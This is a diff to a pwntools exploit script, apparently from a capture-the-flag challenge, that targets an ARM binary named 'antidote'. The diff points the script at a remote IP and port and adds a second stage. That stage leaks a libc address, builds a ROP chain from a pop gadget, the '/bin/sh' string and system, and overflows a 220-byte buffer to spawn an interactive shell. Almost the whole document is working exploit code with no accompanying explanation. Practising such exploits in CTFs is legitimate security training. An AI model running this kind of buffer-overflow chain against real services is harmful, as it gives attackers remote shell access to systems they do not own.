@@ -37,9 +37,9 @@ context.log_level = "debug"
 elf = ELF('./antidote')
 libc = ELF('./libc.so.6')
 
-#ip, port = '165.232.42.8', 30213
-#io = remote(ip, port)
-io = process(['qemu-arm', '-L','/usr/arm-linux-gnueabihf','./antidote'])
+ip, port = '165.232.42.8', 30213
+io = remote(ip, port)
+#io = process(['qemu-arm','-L','/usr/arm-linux-gnueabihf','./antidote'])
 
 payload = 'A'*220
 #write.plt(1, write.got, 4)
@@ -56,3 +56,20 @@ libc_write = hex(u32(buf))
 print 'write address: '+libc_write
 offset = int(libc_write,16) - libc.sym['write']
 print 'libc base address: '+str(hex(offset))
+io.close()
+
+io = remote(ip, port)
+#io = process(['qemu-arm','-L','/usr/arm-linux-gnueabihf','./antidote'])
+
+#ROPgadget --binary libc.so.6 --only pop |grep r0
+#0x00097710 : pop {r0, r1, pc}
+#ROPgadget --binary libc.so.6 --string /bin/sh
+#0x000d5f2c : /bin/sh
+
+libc_base = offset
+payload = 'A'*220
+payload += p32(libc_base+0x00097710) + p32(libc_base+0x000d5f2c) + p32(0) + p32(libc.sym['system'])
+io.recvuntil('Careful there! That hurt!')
+io.sendline(payload)
+io.recv()
+io.interactive()
